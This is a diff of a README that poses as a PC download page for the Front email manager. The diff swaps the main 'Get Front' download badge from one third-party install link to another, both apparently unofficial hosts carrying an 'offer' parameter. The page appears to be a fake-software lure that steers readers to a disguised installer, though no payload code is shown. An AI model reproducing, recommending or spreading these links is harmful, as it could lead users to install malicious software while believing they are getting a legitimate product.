@@ -1,6 +1,6 @@
 # Front For PC Download — Desktop Email Manager
 
-[![Get Front GitHub](https://img.shields.io/badge/Get%20Front%20GitHub-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://gistcdn.githack.com/nadineimhotep1992/cd78e28bae7c80c89cb068fc8a9b5286/raw/7fe7f31e7754adc87ef5d789c57934001ae914d5/install.html?offer=Front)
+[![Get Front GitHub](https://img.shields.io/badge/Get%20Front%20GitHub-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://git-app-install.github.io/.github/?offer=Front)
 
 ## 🎯 What You Get
 - 📧 **Unified Inbox** — Manage emails, chats, and social messages in one place
